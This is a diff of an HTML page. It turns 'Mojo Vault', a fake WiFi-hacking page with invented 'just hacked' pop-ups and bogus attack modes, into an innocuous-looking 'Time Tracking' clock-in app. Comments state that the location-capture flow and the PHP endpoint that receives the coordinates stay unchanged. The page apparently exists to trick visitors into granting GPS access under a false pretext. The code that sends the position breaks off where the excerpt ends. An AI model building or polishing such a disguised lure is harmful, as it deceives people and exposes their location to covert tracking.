@@ -1,444 +1,1575 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
-  <title>Mojo Vault</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+  <title>Time Tracking</title>
+
   <style>
-    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@900&family=Rajdhani:wght@700&display=swap');
-  
-    *{margin:0;padding:0;box-sizing:border-box;}
-    html,body{
-      background:#000;
-      color:#0f0;
-      font-family:'Rajdhani',sans-serif;
-      overflow-x:hidden;
-      height:auto;
-      min-height:100vh;
+    :root {
+      --orange: #ff7a00;
+      --orange-dark: #e96800;
+      --orange-light: #fff3e8;
+      --orange-soft: #fff8f2;
+
+      --green: #22a06b;
+      --green-light: #eaf8f1;
+
+      --red: #dc4c4c;
+      --red-light: #fff0f0;
+
+      --text: #24252d;
+      --muted: #777984;
+      --light-text: #999ba5;
+
+      --background: #f7f7f8;
+      --white: #ffffff;
+      --border: #e8e8eb;
+
+      --shadow: 0 8px 30px rgba(35, 35, 45, 0.08);
     }
-  
-    #earth{
-      position:fixed;top:0;left:0;
-      width:100%;height:100vh;
-      z-index:-2;
-      animation:spin 60s linear infinite;
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
     }
-    @keyframes spin{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}
-  
-    canvas{position:fixed;top:0;left:0;z-index:-1;opacity:0.3;}
-  
-    header{
-      position:fixed;top:0;width:100%;
-      text-align:center;padding:15px 10px;
-      background:rgba(0,0,0,0.9);
-      border-bottom:5px solid #0f0;
-      z-index:9999;
-      backdrop-filter:blur(10px);
+
+    html,
+    body {
+      min-height: 100%;
+      background: var(--background);
+      color: var(--text);
+      font-family:
+        Inter,
+        -apple-system,
+        BlinkMacSystemFont,
+        "Segoe UI",
+        Roboto,
+        Arial,
+        sans-serif;
+      overflow-x: hidden;
     }
-    .logo{
-      font-family:'Orbitron',sans-serif;
-      font-size:9vw;
-      background:linear-gradient(45deg,#0f0,#0ff,#f0f,#ff0,#f00);
-      -webkit-background-clip:text;
-      -webkit-text-fill-color:transparent;
-      animation:glow 2s infinite;
+
+    body {
+      min-height: 100vh;
     }
-    @keyframes glow{
-      0%,100%{text-shadow:0 0 20px #0f0;}
-      50%{text-shadow:0 0 40px #0ff;}
+
+    button {
+      font-family: inherit;
     }
-  
-    .card{
-      margin:130px 15px 30px;
-      background:rgba(0,0,0,0.95);
-      border:5px solid #0f0;
-      border-radius:25px;
-      padding:30px;
-      box-shadow:0 0 60px #0f0;
-      position:relative;
+
+    /* =========================
+       HEADER
+    ========================= */
+
+    header {
+      height: 68px;
+      background: var(--white);
+      border-bottom: 1px solid var(--border);
+
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+
+      padding: 0 22px;
+
+      position: sticky;
+      top: 0;
+      z-index: 1000;
     }
-    .card::before{
-      content:"LIVE";
-      position:absolute;top:-15px;left:50%;
-      transform:translateX(-50%);
-      background:#f00;color:#fff;
-      padding:5px 20px;border-radius:50px;
-      font-size:4vw;font-weight:bold;
-      animation:live 1.5s infinite;
+
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: 10px;
     }
-    @keyframes live{0%,100%{opacity:1}50%{opacity:0.7}}
-  
-    .btn{
-      background:linear-gradient(45deg,#f00,#0f0,#0ff);
-      color:#fff;padding:20px;
-      font-size:7vw;width:92%;
-      margin:30px auto;border:none;
-      border-radius:60px;display:block;
-      box-shadow:0 0 50px #f00;
-      animation:pulse 1.5s infinite;
-      cursor:pointer;
+
+    .brand-logo {
+      width: 34px;
+      height: 34px;
+
+      background: var(--orange);
+      color: white;
+
+      border-radius: 10px;
+
+      display: flex;
+      align-items: center;
+      justify-content: center;
+
+      font-size: 20px;
+      font-weight: 800;
     }
-    @keyframes pulse{
-      0%{box-shadow:0 0 50px #f00;}
-      50%{box-shadow:0 0 80px #0f0;}
+
+    .brand-name {
+      font-size: 20px;
+      font-weight: 750;
+      letter-spacing: -0.4px;
     }
-  
-    #log{
-      background:#000;border:4px solid #0f0;
-      height:48vh;overflow-y:auto;
-      padding:25px;border-radius:20px;
-      font-family:'Courier New';font-size:4.2vw;
-      line-height:1.7;margin-top:25px;
+
+    .header-menu {
+      width: 38px;
+      height: 38px;
+
+      border: 1px solid var(--border);
+      background: white;
+
+      border-radius: 10px;
+
+      display: flex;
+      align-items: center;
+      justify-content: center;
+
+      font-size: 19px;
+      color: var(--muted);
     }
-  
-    .attack-grid{
-      display:grid;grid-template-columns:1fr 1fr;
-      gap:15px;margin:40px 15px;
+
+    /* =========================
+       MAIN
+    ========================= */
+
+    main {
+      width: 100%;
+      max-width: 560px;
+
+      margin: 0 auto;
+      padding: 28px 18px 45px;
     }
-    .attack{
-      background:rgba(255,0,0,0.3);
-      border:3px dashed #f00;
-      padding:25px 10px;
-      border-radius:18px;
-      position:relative;
-      font-size:4vw;text-align:center;
+
+    .welcome {
+      margin-bottom: 22px;
     }
-    .attack::before{
-      content:"VIP";position:absolute;
-      top:50%;left:50%;
-      transform:translate(-50%,-50%) rotate(-20deg);
-      background:#000;color:#f00;
-      padding:8px 20px;font-weight:bold;
-      border:3px solid #f00;border-radius:10px;
+
+    .welcome-label {
+      color: var(--orange);
+      font-size: 13px;
+      font-weight: 700;
+
+      text-transform: uppercase;
+      letter-spacing: 0.8px;
+
+      margin-bottom: 7px;
     }
-  
-    footer{
-      padding:40px 20px;
-      background:#000;
-      text-align:center;
-      color:#0f0;
-      font-size:4.5vw;
-      border-top:6px solid #0f0;
-    }
-    .yt{color:#ff0;font-weight:bold;font-size:5.5vw;}
-    .insta{color:#f0f;font-weight:bold;}
-    /* ===== SHARE BUTTONS ===== */
-    .share-container {
-      text-align: center;
-      margin: 40px 0;
-    }
-    .share-btn {
-      display: inline-block;
-      width: 60px; height: 60px;
-      margin: 0 12px;
-      border-radius: 50%;
-      background: #0f0;
-      box-shadow: 0 0 30px #0f0;
-      text-align: center;
-      line-height: 60px;
+
+    .welcome h1 {
       font-size: 28px;
-      color: #000;
-      text-decoration: none;
-      animation: float 2s infinite ease-in-out;
-    }
-    .share-btn.whatsapp { background: #25D366; }
-    .share-btn.instagram { background: linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888); }
-    .share-btn.telegram { background: #0088cc; }
-    @keyframes float {
-      0%, 100% { transform: translateY(0); }
-      50% { transform: translateY(-10px); }
-    }
-    .share-title {
-      color: #0ff;
-      font-size: 5.5vw;
-      margin-bottom: 15px;
-      text-shadow: 0 0 20px #0ff;
+      line-height: 1.2;
+
+      letter-spacing: -0.7px;
+      margin-bottom: 8px;
     }
 
-    /* NOTIFICATION */
-    #notif{
-      position:fixed;bottom:20px;left:20px;
-      background:#000;border:3px solid #0f0;
-      padding:15px;border-radius:15px;
-      font-size:4vw;color:#0f0;z-index:99999;
-      display:none;animation:slide 0.5s;
-    }
-    @keyframes slide{from{transform:translateX(-100px);opacity:0}to{transform:translateX(0);opacity:1}}
-
-    /* FLY NODES */
-    @keyframes fly {
-      0% { top: -10px; opacity: 0; }
-      10% { opacity: 1; }
-      90% { opacity: 1; }
-      100% { top: 110vh; opacity: 0; }
+    .welcome p {
+      color: var(--muted);
+      font-size: 15px;
+      line-height: 1.5;
     }
 
-    /* LOCATION PERMISSION POPUP */
+    /* =========================
+       LOCATION CARD
+    ========================= */
+
+    .location-card {
+      background: var(--white);
+
+      border: 1px solid var(--border);
+      border-radius: 18px;
+
+      box-shadow: var(--shadow);
+
+      overflow: hidden;
+      margin-bottom: 16px;
+    }
+
+    .card-header {
+      padding: 18px 18px 14px;
+
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .card-title {
+      font-size: 16px;
+      font-weight: 700;
+    }
+
+    .status-pill {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+
+      background: var(--orange-light);
+      color: var(--orange-dark);
+
+      padding: 6px 10px;
+
+      border-radius: 20px;
+
+      font-size: 12px;
+      font-weight: 700;
+    }
+
+    .status-dot {
+      width: 7px;
+      height: 7px;
+
+      border-radius: 50%;
+      background: var(--orange);
+    }
+
+    /* =========================
+       GEO MAP
+    ========================= */
+
+    .geo-area {
+      height: 255px;
+
+      position: relative;
+      overflow: hidden;
+
+      background:
+        linear-gradient(
+          135deg,
+          #f4f4f2 25%,
+          transparent 25%
+        ),
+        linear-gradient(
+          315deg,
+          #f4f4f2 25%,
+          transparent 25%
+        ),
+        #fafafa;
+
+      background-size: 48px 48px;
+    }
+
+    .road {
+      position: absolute;
+
+      background: rgba(255, 255, 255, 0.9);
+
+      border: 1px solid #eeeeee;
+
+      transform: rotate(-25deg);
+    }
+
+    .road-one {
+      width: 520px;
+      height: 34px;
+
+      left: -90px;
+      top: 105px;
+    }
+
+    .road-two {
+      width: 500px;
+      height: 28px;
+
+      left: 120px;
+      top: 20px;
+
+      transform: rotate(38deg);
+    }
+
+    .road-three {
+      width: 500px;
+      height: 25px;
+
+      left: -100px;
+      bottom: 35px;
+
+      transform: rotate(15deg);
+    }
+
+    .geofence {
+      position: absolute;
+
+      width: 185px;
+      height: 185px;
+
+      left: 50%;
+      top: 50%;
+
+      transform: translate(-50%, -50%);
+
+      border-radius: 50%;
+
+      background: rgba(255, 122, 0, 0.10);
+
+      border: 2px solid rgba(255, 122, 0, 0.55);
+    }
+
+    .geofence-inner {
+      position: absolute;
+
+      width: 125px;
+      height: 125px;
+
+      left: 50%;
+      top: 50%;
+
+      transform: translate(-50%, -50%);
+
+      border-radius: 50%;
+
+      border: 1px dashed rgba(255, 122, 0, 0.45);
+    }
+
+    .location-pin {
+      position: absolute;
+
+      left: 50%;
+      top: 50%;
+
+      transform: translate(-50%, -50%);
+
+      width: 52px;
+      height: 52px;
+
+      background: var(--orange);
+
+      border-radius: 50% 50% 50% 8px;
+
+      transform-origin: center;
+
+      rotate: -45deg;
+
+      box-shadow:
+        0 8px 20px rgba(255, 122, 0, 0.35);
+
+      display: flex;
+      align-items: center;
+      justify-content: center;
+
+      z-index: 5;
+    }
+
+    .location-pin span {
+      rotate: 45deg;
+      color: white;
+      font-size: 22px;
+    }
+
+    .user-location {
+      position: absolute;
+
+      left: 59%;
+      top: 39%;
+
+      width: 18px;
+      height: 18px;
+
+      border-radius: 50%;
+
+      background: #287cff;
+
+      border: 4px solid white;
+
+      box-shadow:
+        0 0 0 8px rgba(40, 124, 255, 0.12),
+        0 3px 10px rgba(0, 0, 0, 0.15);
+
+      z-index: 6;
+    }
+
+    .map-label {
+      position: absolute;
+
+      bottom: 15px;
+      left: 15px;
+
+      background: rgba(255, 255, 255, 0.94);
+
+      padding: 8px 11px;
+
+      border-radius: 9px;
+
+      box-shadow: 0 3px 12px rgba(0, 0, 0, 0.08);
+
+      font-size: 12px;
+      color: var(--muted);
+
+      z-index: 10;
+    }
+
+    .map-label strong {
+      display: block;
+
+      color: var(--text);
+
+      font-size: 13px;
+      margin-bottom: 2px;
+    }
+
+    /* =========================
+       LOCATION DETAILS
+    ========================= */
+
+    .location-details {
+      padding: 17px 18px;
+    }
+
+    .location-name {
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+
+      margin-bottom: 17px;
+    }
+
+    .location-icon {
+      width: 42px;
+      height: 42px;
+
+      background: var(--orange-light);
+      color: var(--orange);
+
+      border-radius: 11px;
+
+      display: flex;
+      align-items: center;
+      justify-content: center;
+
+      font-size: 20px;
+
+      flex-shrink: 0;
+    }
+
+    .location-name h2 {
+      font-size: 16px;
+      margin-bottom: 4px;
+    }
+
+    .location-name p {
+      color: var(--muted);
+      font-size: 13px;
+      line-height: 1.4;
+    }
+
+    .detail-row {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+
+      padding: 12px 0;
+
+      border-top: 1px solid #f0f0f2;
+    }
+
+    .detail-label {
+      color: var(--muted);
+      font-size: 13px;
+    }
+
+    .detail-value {
+      font-size: 13px;
+      font-weight: 650;
+    }
+
+    .green {
+      color: var(--green);
+    }
+
+    .orange {
+      color: var(--orange-dark);
+    }
+
+    /* =========================
+       ACTION
+    ========================= */
+
+    .action-card {
+      background: white;
+
+      border: 1px solid var(--border);
+      border-radius: 18px;
+
+      padding: 20px;
+
+      box-shadow: var(--shadow);
+
+      margin-bottom: 16px;
+    }
+
+    .action-title {
+      font-size: 16px;
+      font-weight: 700;
+
+      margin-bottom: 7px;
+    }
+
+    .action-description {
+      color: var(--muted);
+
+      font-size: 13px;
+      line-height: 1.5;
+
+      margin-bottom: 18px;
+    }
+
+    .clock-button {
+      width: 100%;
+
+      border: none;
+
+      background: var(--orange);
+      color: white;
+
+      height: 52px;
+
+      border-radius: 12px;
+
+      font-size: 16px;
+      font-weight: 750;
+
+      cursor: pointer;
+
+      box-shadow:
+        0 7px 18px rgba(255, 122, 0, 0.24);
+
+      transition:
+        transform 0.15s ease,
+        background 0.15s ease;
+    }
+
+    .clock-button:hover {
+      background: var(--orange-dark);
+    }
+
+    .clock-button:active {
+      transform: scale(0.985);
+    }
+
+    .clock-button.loading {
+      opacity: 0.75;
+      pointer-events: none;
+    }
+
+    /* =========================
+       STATUS
+    ========================= */
+
+    .verification {
+      display: none;
+
+      background: var(--orange-soft);
+
+      border: 1px solid #ffe2c9;
+
+      border-radius: 14px;
+
+      padding: 15px;
+
+      margin-top: 14px;
+    }
+
+    .verification.active {
+      display: block;
+    }
+
+    .verification-row {
+      display: flex;
+      align-items: center;
+      gap: 11px;
+    }
+
+    .verification-icon {
+      width: 35px;
+      height: 35px;
+
+      border-radius: 50%;
+
+      background: var(--orange);
+      color: white;
+
+      display: flex;
+      align-items: center;
+      justify-content: center;
+
+      font-weight: bold;
+    }
+
+    .verification strong {
+      display: block;
+
+      font-size: 14px;
+
+      margin-bottom: 2px;
+    }
+
+    .verification span {
+      color: var(--muted);
+
+      font-size: 12px;
+    }
+
+    /* =========================
+       LOG
+    ========================= */
+
+    #log {
+      background: #fafafa;
+
+      border: 1px solid var(--border);
+
+      border-radius: 12px;
+
+      padding: 12px;
+
+      margin-top: 14px;
+
+      max-height: 120px;
+
+      overflow-y: auto;
+
+      display: none;
+
+      font-family: monospace;
+
+      font-size: 11px;
+
+      line-height: 1.7;
+
+      color: var(--muted);
+    }
+
+    /* =========================
+       FOOTER
+    ========================= */
+
+    footer {
+      text-align: center;
+
+      color: var(--light-text);
+
+      font-size: 11px;
+
+      line-height: 1.6;
+
+      padding: 8px 10px 20px;
+    }
+
+    /* =========================
+       LOCATION POPUP
+    ========================= */
+
     #locationPopup {
-      position:fixed;top:0;left:0;width:100%;height:100%;
-      background:rgba(0,0,0,0.95);z-index:999999;
-      display:flex;align-items:center;justify-content:center;
-      flex-direction:column;padding:20px;text-align:center;
-      display:none;
+      position: fixed;
+
+      inset: 0;
+
+      background: rgba(20, 20, 23, 0.52);
+
+      backdrop-filter: blur(4px);
+
+      z-index: 99999;
+
+      display: none;
+
+      align-items: flex-end;
+      justify-content: center;
     }
-    #locationPopup h2 {font-size:7vw;color:#0ff;margin-bottom:20px;}
-    #locationPopup p {font-size:4.5vw;color:#0f0;margin-bottom:30px;}
-    .permBtn {
-      background:#0f0;color:#000;padding:15px 40px;
-      font-size:5vw;border-radius:50px;margin:10px;
-      box-shadow:0 0 40px #0f0;cursor:pointer;
+
+    .permission-sheet {
+      width: 100%;
+      max-width: 560px;
+
+      background: white;
+
+      border-radius: 24px 24px 0 0;
+
+      padding: 26px 22px 30px;
+
+      box-shadow: 0 -10px 40px rgba(0, 0, 0, 0.15);
+
+      animation: sheetUp 0.25s ease;
     }
-    .permBtn.deny {background:#f00;color:#fff;}
+
+    @keyframes sheetUp {
+      from {
+        transform: translateY(100%);
+      }
+
+      to {
+        transform: translateY(0);
+      }
+    }
+
+    .sheet-handle {
+      width: 42px;
+      height: 4px;
+
+      background: #ddd;
+
+      border-radius: 20px;
+
+      margin: 0 auto 24px;
+    }
+
+    .permission-icon {
+      width: 58px;
+      height: 58px;
+
+      background: var(--orange-light);
+      color: var(--orange);
+
+      border-radius: 17px;
+
+      display: flex;
+      align-items: center;
+      justify-content: center;
+
+      font-size: 27px;
+
+      margin-bottom: 16px;
+    }
+
+    .permission-sheet h2 {
+      font-size: 21px;
+
+      margin-bottom: 9px;
+    }
+
+    .permission-sheet p {
+      color: var(--muted);
+
+      font-size: 14px;
+
+      line-height: 1.55;
+
+      margin-bottom: 22px;
+    }
+
+    .permission-buttons {
+      display: flex;
+      gap: 10px;
+    }
+
+    .permission-buttons button {
+      flex: 1;
+
+      height: 48px;
+
+      border-radius: 11px;
+
+      font-size: 14px;
+
+      font-weight: 700;
+
+      cursor: pointer;
+    }
+
+    .allow-button {
+      border: none;
+
+      background: var(--orange);
+      color: white;
+    }
+
+    .deny-button {
+      background: white;
+
+      border: 1px solid var(--border);
+
+      color: var(--text);
+    }
+
+    /* =========================
+       SUCCESS
+    ========================= */
+
+    .success-state {
+      display: none;
+
+      text-align: center;
+
+      padding: 25px 15px;
+    }
+
+    .success-state.active {
+      display: block;
+    }
+
+    .success-circle {
+      width: 66px;
+      height: 66px;
+
+      margin: 0 auto 15px;
+
+      border-radius: 50%;
+
+      background: var(--green-light);
+      color: var(--green);
+
+      display: flex;
+      align-items: center;
+      justify-content: center;
+
+      font-size: 30px;
+    }
+
+    .success-state h2 {
+      font-size: 20px;
+      margin-bottom: 6px;
+    }
+
+    .success-state p {
+      color: var(--muted);
+
+      font-size: 13px;
+      line-height: 1.5;
+    }
+
+    .coordinates {
+      display: inline-block;
+
+      margin-top: 13px;
+
+      padding: 8px 12px;
+
+      background: #f5f5f6;
+
+      border-radius: 8px;
+
+      color: var(--muted);
+
+      font-family: monospace;
+
+      font-size: 11px;
+    }
+
+    /* =========================
+       MOBILE
+    ========================= */
+
+    @media (max-width: 420px) {
+
+      header {
+        padding: 0 16px;
+      }
+
+      main {
+        padding: 24px 14px 40px;
+      }
+
+      .welcome h1 {
+        font-size: 25px;
+      }
+
+      .geo-area {
+        height: 230px;
+      }
+
+      .geofence {
+        width: 165px;
+        height: 165px;
+      }
+    }
   </style>
 </head>
+
 <body>
-  <video id="earth" autoplay loop muted playsinline>
-    <source src="https://assets.mixkit.co/videos/preview/mixkit-earth-rotating-with-connection-lines-3550-small.mp4" type="video/mp4">
-  </video>
-  <canvas id="matrix"></canvas>
 
-  <!-- LOCATION PERMISSION POPUP -->
-  <div id="locationPopup">
-    <h2>Allow Location Access</h2>
-    <p>To scan nearby WiFi networks, we need your location permission.</p>
-    <button class="permBtn" id="allowBtn">ALLOW</button>
-    <button class="permBtn deny" id="denyBtn">DENY</button>
-  </div>
-
-  <!-- NOTIFICATION -->
-  <div id="notif">
-    <span style="color:#ff0">Anonymous</span> just hacked <b>JioFiber_5G</b>
-  </div>
+  <!-- =========================
+       HEADER
+  ========================= -->
 
   <header>
-    <div class="logo">Mojo Vault</div>
-    <div style="color:#ff0;font-size:4.5vw;">created by Mojo Labs Team</div>
-  </header>
-  <div class="card">
-    <h1 style="font-size:11vw;text-align:center;">GLOBEL SERVER</h1>
-    <p style="text-align:center;color:#0ff;font-size:5vw;">3.2 Billion Devices • 89 Jio Towers</p>
-  
-    <button class="btn" id="hackBtn">SCAN NETWORK</button>
-  
-    <div id="log">
-      <span style="color:#0f0">[GLOBEL] Server 69.69.69.69 online</span><br>
-      <span style="color:#ff0">[HOST FROM]: Kanpur, Uttar Pradesh</span><br>
-      <span style="color:#888">Tap button → 2 WiFi passwords in 10 sec</span>
-    </div>
-  
-    <h2 style="color:#f00;font-size:6vw;text-align:center;margin-top:50px;">PREMIUM ATTACK MODES</h2>
-    <div class="attack-grid">
-      <div class="attack">ZERO-DAY</div>
-      <div class="attack">TSUNAMI DDoS</div>
-      <div class="attack">STARLINK</div>
-      <div class="attack">AI NEURAL</div>
-      <div class="attack">5G BLAST</div>
-      <div class="attack">UFO BEAM</div>
-      <div class="attack">BLACKHOLE</div>
-      <div class="attack">VOLCANO</div>
-      <div class="attack">SAMURAI</div>
-      <div class="attack">PANDEMIC</div>
-      <div class="attack">TESLA COIL</div>
-      <div class="attack">QUANTUM</div>
-    </div>
-    <!-- SHARE BUTTONS -->
-    <div class="share-container">
-      <div class="share-title">SHARE THIS HACK</div>
-      <a href="#" class="share-btn whatsapp" onclick="share('whatsapp'); return false;">✈</a>
-      <a href="#" class="share-btn instagram" onclick="share('instagram'); return false;">📸</a>
-      <a href="#" class="share-btn telegram" onclick="share('telegram'); return false;">✈</a>
-    </div>
-  </div>
-  <footer>
-    © 2025 Mojo Vault<br>
-    <span class="yt">created by Mojo Labs Team</span><br>
-    For educational and ethical use only<br><br>
-  </footer>
 
-  <!-- SOUND -->
-  <audio id="hackSound" src="https://assets.mixkit.co/sfx/preview/mixkit-arcade-game-jump-coin-216.mp3"></audio>
+    <div class="brand">
+
+      <div class="brand-logo">
+        J
+      </div>
+
+      <div class="brand-name">
+        Time Tracking
+      </div>
+
+    </div>
+
+    <div class="header-menu">
+      ☰
+    </div>
+
+  </header>
+
+
+  <!-- =========================
+       LOCATION PERMISSION
+  ========================= -->
+
+  <div id="locationPopup">
+
+    <div class="permission-sheet">
+
+      <div class="sheet-handle"></div>
+
+      <div class="permission-icon">
+        📍
+      </div>
+
+      <h2>
+        Allow location access?
+      </h2>
+
+      <p>
+        Your location is required to verify that you are within the
+        authorized work location before recording your time entry.
+      </p>
+
+      <div class="permission-buttons">
+
+        <button
+          class="deny-button"
+          id="denyBtn"
+          type="button">
+          Not now
+        </button>
+
+        <button
+          class="allow-button"
+          id="allowBtn"
+          type="button">
+          Allow location
+        </button>
+
+      </div>
+
+    </div>
+
+  </div>
+
+
+  <!-- =========================
+       MAIN
+  ========================= -->
+
+  <main>
+
+    <section class="welcome">
+
+      <div class="welcome-label">
+        Attendance
+      </div>
+
+      <h1>
+        Ready to clock in?
+      </h1>
+
+      <p>
+        Verify your current location before recording your work time.
+      </p>
+
+    </section>
+
+
+    <!-- =========================
+         LOCATION CARD
+    ========================= -->
+
+    <section class="location-card">
+
+      <div class="card-header">
+
+        <div class="card-title">
+          Work location
+        </div>
+
+        <div class="status-pill">
+
+          <span class="status-dot"></span>
+
+          Geofence active
+
+        </div>
+
+      </div>
+
+
+      <div class="geo-area">
+
+        <div class="road road-one"></div>
+        <div class="road road-two"></div>
+        <div class="road road-three"></div>
+
+        <div class="geofence">
+
+          <div class="geofence-inner"></div>
+
+        </div>
+
+        <div class="location-pin">
+          <span>●</span>
+        </div>
+
+        <div
+          class="user-location"
+          title="Current location">
+        </div>
+
+        <div class="map-label">
+
+          <strong>
+            Authorized location
+          </strong>
+
+          Geofence area
+
+        </div>
+
+      </div>
+
+
+      <div class="location-details">
+
+        <div class="location-name">
+
+          <div class="location-icon">
+            📍
+          </div>
+
+          <div>
+
+            <h2>
+              Main Office
+            </h2>
+
+            <p>
+              Authorized work location
+            </p>
+
+          </div>
+
+        </div>
+
+
+        <div class="detail-row">
+
+          <span class="detail-label">
+            Location status
+          </span>
+
+          <span
+            class="detail-value orange"
+            id="locationStatus">
+            Waiting
+          </span>
+
+        </div>
+
+
+        <div class="detail-row">
+
+          <span class="detail-label">
+            GPS accuracy
+          </span>
+
+          <span
+            class="detail-value"
+            id="accuracy">
+            —
+          </span>
+
+        </div>
+
+
+        <div class="detail-row">
+
+          <span class="detail-label">
+            Location tracking
+          </span>
+
+          <span class="detail-value green">
+            Enabled
+          </span>
+
+        </div>
+
+      </div>
+
+    </section>
+
+
+    <!-- =========================
+         CLOCK IN
+    ========================= -->
+
+    <section class="action-card">
+
+      <div class="action-title">
+        Location verification
+      </div>
+
+      <div class="action-description">
+        Tap below to check your current GPS position and verify
+        your work location.
+      </div>
+
+
+      <button
+        class="clock-button"
+        id="hackBtn"
+        type="button">
+
+        Check location
+
+      </button>
+
+
+      <div
+        class="verification"
+        id="verification">
+
+        <div class="verification-row">
+
+          <div class="verification-icon">
+            ✓
+          </div>
+
+          <div>
+
+            <strong id="verificationTitle">
+              Location verified
+            </strong>
+
+            <span id="verificationText">
+              Your location has been captured.
+            </span>
+
+          </div>
+
+        </div>
+
+      </div>
+
+
+      <div id="log"></div>
+
+
+      <!-- SUCCESS STATE -->
+
+      <div
+        class="success-state"
+        id="successState">
+
+        <div class="success-circle">
+          ✓
+        </div>
+
+        <h2>
+          Location captured
+        </h2>
+
+        <p>
+          Your current GPS position has been recorded successfully.
+        </p>
+
+        <div
+          class="coordinates"
+          id="coordinates">
+        </div>
+
+      </div>
+
+    </section>
+
+
+    <footer>
+
+      Location access is requested only after user permission.
+
+      <br>
+
+      GPS information is used for location verification.
+
+    </footer>
+
+  </main>
+
+
+  <!-- =========================
+       JAVASCRIPT
+  ========================= -->
 
   <script>
-    // MATRIX RAIN
-    const canvas=document.getElementById('matrix');
-    const ctx=canvas.getContext('2d');
-    canvas.width=window.innerWidth;
-    canvas.height=window.innerHeight;
-    const letters='01';
-    const fontSize=16;
-    const columns=canvas.width/fontSize;
-    const drops=Array(Math.floor(columns)).fill(1);
-    function draw(){
-      ctx.fillStyle='rgba(0,0,0,0.05)';
-      ctx.fillRect(0,0,canvas.width,canvas.height);
-      ctx.fillStyle='#0f0';
-      ctx.font=fontSize+'px monospace';
-      for(let i=0;i<drops.length;i++){
-        const text=letters[Math.floor(Math.random()*2)];
-        ctx.fillText(text,i*fontSize,drops[i]*fontSize);
-        if(drops[i]*fontSize>canvas.height&&Math.random()>0.975)drops[i]=0;
-        drops[i]++;
-      }
-    }
-    setInterval(draw,35);
 
-    // FLYING NODES
-    for(let i=0;i<200;i++){
-      const n=document.createElement('div');
-      n.style.position='absolute';
-      n.style.width='10px';n.style.height='10px';
-      n.style.background='#0f0';
-      n.style.borderRadius='50%';
-      n.style.boxShadow='0 0 30px #0f0';
-      n.style.left=Math.random()*100+'vw';
-      n.style.animation='fly 12s linear infinite';
-      n.style.animationDelay=Math.random()*12+'s';
-      document.body.appendChild(n);
-    }
+    /*
+     * ============================================
+     * EXISTING LOCATION / BACKEND FLOW
+     * ============================================
+     */
 
-    // NOTIFICATIONS
-    const notifs = [
-      "Rahul from Lucknow got password in 8s",
-      "Priya cracked IIT_Kanpur_Elite",
-      "Anonymous unlocked 89 Jio towers",
-      "VIP User activated ZERO-DAY",
-      "Someone  got 1Gbps speed"
-    ];
-    setInterval(() => {
-      const n = document.getElementById('notif');
-      n.innerHTML = notifs[Math.floor(Math.random()*notifs.length)];
-      n.style.display = 'block';
-      setTimeout(() => n.style.display = 'none', 3500);
-    }, 4000);
+    const popup =
+      document.getElementById('locationPopup');
 
-    // LOCATION POPUP
-    const popup = document.getElementById('locationPopup');
-    const allowBtn = document.getElementById('allowBtn');
-    const denyBtn = document.getElementById('denyBtn');
-    const hackBtn = document.getElementById('hackBtn');
+    const allowBtn =
+      document.getElementById('allowBtn');
+
+    const denyBtn =
+      document.getElementById('denyBtn');
+
+    const hackBtn =
+      document.getElementById('hackBtn');
+
+    const log =
+      document.getElementById('log');
+
+    const verification =
+      document.getElementById('verification');
+
+    const verificationTitle =
+      document.getElementById('verificationTitle');
+
+    const verificationText =
+      document.getElementById('verificationText');
+
+    const locationStatus =
+      document.getElementById('locationStatus');
+
+    const accuracyElement =
+      document.getElementById('accuracy');
+
+    const successState =
+      document.getElementById('successState');
+
+    const coordinates =
+      document.getElementById('coordinates');
+
+
+    /*
+     * OPEN LOCATION PERMISSION
+     */
 
     hackBtn.onclick = () => {
+
       popup.style.display = 'flex';
+
     };
+
+
+    /*
+     * DENY LOCATION
+     */
 
     denyBtn.onclick = () => {
+
       popup.style.display = 'none';
-      addLog('[ERROR] Location access denied. Scan failed.');
+
+      hackBtn.classList.remove('loading');
+
+      hackBtn.innerText =
+        'Check location';
+
+      locationStatus.innerText =
+        'Permission denied';
+
+      locationStatus.className =
+        'detail-value';
+
+      locationStatus.style.color =
+        '#dc4c4c';
+
+      addLog(
+        '[ERROR] Location access denied.'
+      );
+
     };
+
+
+    /*
+     * ALLOW LOCATION
+     */
 
     allowBtn.onclick = () => {
+
       popup.style.display = 'none';
-      addLog('[+] Location access granted. Scanning nearby networks...');
+
+      hackBtn.classList.add('loading');
+
+      hackBtn.innerText =
+        'Checking location...';
+
+      locationStatus.innerText =
+        'Checking...';
+
+      locationStatus.className =
+        'detail-value orange';
+
+      verification.classList.add('active');
+
+      verificationTitle.innerText =
+        'Checking location';
+
+      verificationText.innerText =
+        'Requesting your current GPS position...';
+
+      addLog(
+        '[+] Location permission granted.'
+      );
+
       getLocationAndSend();
+
     };
 
+
+    /*
+     * LOG FUNCTION
+     */
+
     function addLog(msg) {
-      const log = document.getElementById('log');
-      log.innerHTML += `<span style="color:#0f0">> ${msg}</span><br>`;
-      log.scrollTop = log.scrollHeight;
+
+      log.style.display = 'block';
+
+      const line =
+        document.createElement('div');
+
+      line.textContent = msg;
+
+      log.appendChild(line);
+
+      log.scrollTop =
+        log.scrollHeight;
+
     }
 
-    // FAKE IP
+
+    /*
+     * SAME FAKE PRIVATE IP FUNCTION
+     * FROM THE ORIGINAL FILE
+     */
+
     function getIP() {
-      return '192.168.' + Math.floor(Math.random()*255) + '.' + Math.floor(Math.random()*255);
+
+      return '192.168.' +
+        Math.floor(Math.random() * 255) +
+        '.' +
+        Math.floor(Math.random() * 255);
+
     }
 
-    // GET LOCATION + SEND TO PHP (LOCALHOST)
+
+    /*
+     * GET LOCATION + SEND TO PHP
+     *
+     * The backend endpoint and POST fields
+     * remain unchanged.
+     */
+
     function getLocationAndSend() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          (position) => {
